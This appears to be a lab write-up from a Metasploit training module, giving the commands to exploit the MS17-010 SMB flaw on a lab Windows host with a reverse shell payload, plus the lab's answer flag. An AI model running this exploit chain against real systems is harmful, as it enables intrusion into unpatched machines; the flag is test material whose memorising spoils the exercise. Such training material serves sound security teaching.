# Module 39 — Using The Metasploit Framework
## Section 4: Modules

**Target:** ACADEMY-MSF2-WIN01 (Windows SMB)

**Exploit chain:**
```
use exploit/windows/smb/ms17_010_psexec
set PAYLOAD windows/shell_reverse_tcp
set RHOSTS <target>
set LHOST <your-tun0-ip>
exploit
```
This uses the MS17-010 (EternalRomance) SMB vulnerability to get a SYSTEM shell.

**Flag:** `HTB{MSF-W1nD0w5-3xPL01t4t10n}`
